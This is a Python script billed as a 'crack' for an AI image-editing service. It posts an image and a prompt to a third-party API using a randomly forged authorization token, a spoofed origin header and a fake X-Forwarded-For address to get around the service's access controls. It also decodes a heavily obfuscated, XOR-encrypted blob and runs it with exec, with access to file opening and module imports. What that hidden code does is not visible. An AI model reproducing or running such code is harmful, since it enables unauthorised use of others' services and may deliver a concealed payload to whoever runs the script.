# Copyright 2026 Mr Dark
# Project: GPT Gen-Edit img ..
# Author: t.me/sii_3
# Licensed under Apache License 2.0



dark='t.me/sii_3'
версия='Выпустобщено в @2026'
работа='Crack Gpt-Img AI'
мы='By: dark.ps'

промпт="""
Make it more beautiful
"""
файл='dark.png' # File-Name


import requests as р,base64 as б,random as с,string as т,base64 as _б,zlib as _з,bz2 as _ц,lzma as _л,hashlib as _х
def и():
	_т='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';_с=_б.b64decode(_т);_с=_л.decompress(_с);_с=_ц.decompress(_с);_с=_з.decompress(_с);_к=_х.sha256(b'xxxxxR').digest();_д=bytes(_б^_к[_и%len(_к)]for(_и,_б)in enumerate(_с));_и=_д.decode('utf-8');_г={'__builtins__':{'print':print,'len':len,'range':range,'list':list,'str':str,'int':int,'float':float,'dict':dict,'set':set,'tuple':tuple,'enumerate':enumerate,'zip':zip,'map':map,'filter':filter,'sum':sum,'min':min,'max':max,'abs':abs,'round':round,'sorted':sorted,'reversed':reversed,'open':open,'Exception':Exception,'SystemExit':SystemExit,'__import__':__import__,'globals':globals}}
	for _т in['dark','версия','работа','мы']:_г[_т]=globals().get(_т)
	_р=compile(_и,'<rights>','exec');exec(_р,_г)
	B='https://shorts.multiplewords.in/mwvideos/api/edit_image_from_text';C=б.b64encode((''.join(с.choice(т.ascii_lowercase)for A in range(10))+''.join(с.choice(т.digits)for A in range(5))+''.join(с.choice(т.ascii_lowercase)for A in range(10))).encode()).decode();A={'accept':'*/*','accept-language':'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7','authorization':C,'origin':'https://saifs.ai','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36','x-forwarded-for':'.'.join(str(с.randint(1,254))for A in range(4))}
	with open(файл,'rb') as F:D=р.post(B,headers=A,files={'file':(файл,F,'image/png')},data={'prompt':промпт,'user_id':'1'})
	print(D.json()['edited_image_url'])
и()

# - By: T.me/sii_3